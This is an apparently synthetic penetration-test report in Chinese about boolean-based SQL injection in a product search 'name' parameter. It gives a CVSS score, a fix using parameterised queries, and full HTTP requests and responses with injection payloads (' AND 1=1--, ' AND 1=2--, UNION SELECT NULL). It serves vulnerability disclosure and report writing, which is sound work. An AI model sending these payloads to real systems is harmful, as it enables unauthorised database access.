# 示例系统-商品搜索 name 参数 SQL 注入：真假条件改变查询结果

CVSS 4.0：CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N  评分 5.3（中危）

## 描述
普通用户搜索 `alpha` 返回一条商品。在 `name` 参数后追加恒真和恒假条件。真条件发出 2 次，均返回一条；假条件发出 2 次，均返回零条，表现符合布尔型 SQL 注入特征。UNION 请求返回 400，未取得其他数据；本次未测试依赖字段值的条件。
### 定级依据
需要普通账号。本次只确认真假条件能改变查询结果，没有读取字段值或其他数据。向量中的机密性影响按注入后可能读取数据的情形评分；实际数据读取影响尚未验证，评分前提需复核。

## 修复建议
将 `name` 参数改为参数化查询，确保输入只按普通值处理，不改变 SQL 语句结构。源码和数据库版本未核实。

## 测试过程
### 发现过程与攻击思路
搜索 `alpha` 得到一条商品。只修改 `name` 参数追加恒真或恒假条件；真条件发送 2 次，均返回一条，假条件发送 2 次，均返回零条。
### 失败尝试与未验证项
UNION 请求返回 400，未取得额外数据。字段值读取、数据库版本、表结构、写入和命令执行未验证。
### Burp 复现
本次结果来自离线合成报文，未在 Burp Repeater 中复测。授权环境中正常登录后捕获请求，只修改 `name` 并比较结果。以下是真条件请求模板，未发送：

```http
GET /api/products?name=alpha%27%20AND%201%3D1--%20 HTTP/1.1
Host: <授权目标域名>
Authorization: <由授权账号正常登录后捕获>
```

## 攻击链路
```text
普通用户搜索商品
├─ GET /api/products?name=alpha
│  └─ 返回 1 条
├─ GET /api/products?name=alpha%27%20AND%201%3D1--%20（2 次）
│  └─ 两次均返回 1 条
├─ GET /api/products?name=alpha%27%20AND%201%3D2--%20（2 次）
│  └─ 两次均返回 0 条
└─ GET /api/products?name=alpha%27%20UNION%20SELECT%20NULL--%20
   └─ 返回 400，未取得数据
```

## 证据说明
来源为离线合成报文，没有访问真实服务。完整请求与响应按用途附在下方。
### 复测标准
参数化查询生效后，真、假条件文本都应作为普通搜索值处理，不能改变查询结构；比较响应记录数和查询结果。

**完整请求与响应**

**正常搜索**

请求：

```http
GET /api/products?name=alpha HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"items":[{"id":"product-a","name":"alpha"}],"total":1}
```

**真条件搜索**

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D1--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"items":[{"id":"product-a","name":"alpha"}],"total":1}
```

**假条件搜索**

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D2--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"items":[],"total":0}
```

**再次发送真条件搜索**

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D1--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"items":[{"id":"product-a","name":"alpha"}],"total":1}
```

**再次发送假条件搜索**

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D2--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"items":[],"total":0}
```

**UNION 方式搜索**

请求：

```http
GET /api/products?name=alpha%27%20UNION%20SELECT%20NULL--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json
Content-Length: 26

{"error":"query_rejected"}
```
